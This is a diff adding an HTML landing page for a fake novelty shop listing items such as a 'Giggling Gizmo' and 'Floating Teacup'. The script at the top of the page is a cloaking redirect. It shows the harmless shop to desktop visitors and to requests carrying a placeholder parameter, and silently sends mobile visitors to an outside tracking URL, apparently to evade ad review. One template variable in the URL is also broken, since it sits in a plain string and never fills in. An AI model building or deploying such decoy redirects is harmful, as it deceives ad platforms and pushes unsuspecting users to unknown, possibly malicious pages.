@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = "https://klcxb6.mcgo2.com/visit/2b563712-fe69-4179-9e2f-168dcbbd0547?s1=${s}";
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Whimsical Wonders Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background-color: #FFD700;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #4B0082;
+            font-size: 3em;
+            text-shadow: 2px 2px #FFA500;
+        }
+        nav {
+            background-color: #00CED1;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px;
+        }
+        nav a {
+            color: #FFFFFF;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: #98FB98;
+            border: 3px dashed #FF4500;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+        }
+        footer {
+            background-color: #9370DB;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Whimsical Wonders Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Giggling Gizmo</h2>
+            <p>A device that makes you laugh uncontrollably!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Rainbow Socks</h2>
+            <p>Socks that change color with your mood!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Whispering Pillow</h2>
+            <p>A pillow that tells you bedtime stories!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Invisible Ink Pen</h2>
+            <p>Write secret messages only you can see!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Floating Teacup</h2>
+            <p>Enjoy your tea while it magically floats!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Singing Plant</h2>
+            <p>A plant that serenades you with lovely tunes!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Whimsical Wonders Emporium. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
